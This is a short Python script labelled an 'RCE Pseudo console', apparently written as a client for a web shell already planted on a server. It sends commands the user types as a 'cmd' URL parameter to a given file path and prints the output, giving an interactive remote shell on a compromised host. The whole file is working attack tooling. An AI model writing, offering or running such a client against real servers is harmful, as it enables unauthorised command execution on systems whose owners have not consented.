import requests
import argparse
import os
import urllib.parse



ROJO = "\033[31m"
VERDE = "\033[32m"
AZUL = "\033[34m"
RESET = "\033[0m"



def clear():
    os.system('clear')


def send_command(path):
    while True:
        command = urllib.parse.quote(input(f"{ROJO}RCE{RESET} {AZUL}${RESET}{VERDE}>>{RESET} "))

        pwned = f'{path}?cmd={command}'

        try:
            response = requests.get(pwned)

            if response.status_code == 200 and len(response.text)>= 1:
                clear()
                print(response.text)
                
            else:
                print(f"Estatus code error: {response.status_code}, Or there's no output")

        except KeyboardInterrupt:
            print(f"exiting ...")


def main():

    parser = argparse.ArgumentParser(description="RCE Pseudo console")

    parser.add_argument('-p','--path',type=str,required=True,help='Url Path of the file')

    args = parser.parse_args()

    send_command(args.path)


if __name__ == "__main__":
    main()

